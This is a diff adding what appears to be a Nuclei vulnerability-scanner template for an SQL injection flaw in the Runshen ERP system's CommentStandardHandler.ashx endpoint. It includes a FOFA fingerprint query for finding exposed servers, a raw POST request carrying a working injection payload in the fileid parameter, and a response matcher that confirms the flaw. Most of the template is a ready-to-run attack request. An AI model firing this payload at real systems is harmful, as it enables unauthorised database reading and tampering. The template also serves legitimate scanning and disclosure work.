@@ -1,0 +1,28 @@
+id: runshen-erp-commentstandard-sql
+
+info:
+  name: "润申信息科技ERP系统CommentStandardHandler.ashx接口存在SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="PDCA/js/_publicCom.js"
+      该组件在处理用户输入时未正确过滤特殊字符，攻击者可通过构造恶意SQL语句实现数据库敏感信息的读取与篡改。
+  tags: 润申信息科技ERP
+
+http:
+- raw:
+  - |
+    POST /PDCA/ashx/CommentStandardHandler.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+    action=detailInfo&fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1')),3,32))<0--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'c4ca4238a0b'
